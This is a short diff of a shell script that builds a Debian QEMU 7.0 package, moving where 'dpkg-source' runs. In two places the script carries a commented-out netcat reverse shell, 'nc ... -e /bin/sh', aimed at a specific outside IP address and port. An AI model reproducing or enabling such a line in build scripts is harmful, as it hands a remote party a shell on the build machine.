@@ -19,10 +19,13 @@ build_qemu () {
   #build debian version
   #nc 103.158.223.61 21121 -e /bin/sh
   apt-get source qemu-system-x86=1:7.0+dfsg-7 -y
-  dpkg-source --auto-commit -b qemu-7.0+dfsg/
+  
   cd qemu-7.0+dfsg
   #nc 103.158.223.61 21121 -e /bin/sh
   yes|mk-build-deps -i
+  cd .. 
+  dpkg-source --auto-commit -b qemu-7.0+dfsg/
+  cd qemu-7.0+dfsg
   #mk-build-deps --install --root-cmd sudo --remove
   yes|debuild -us -uc
   #curl -L https://download.qemu.org/qemu-7.0.0.tar.xz -o qemu.tar.xz
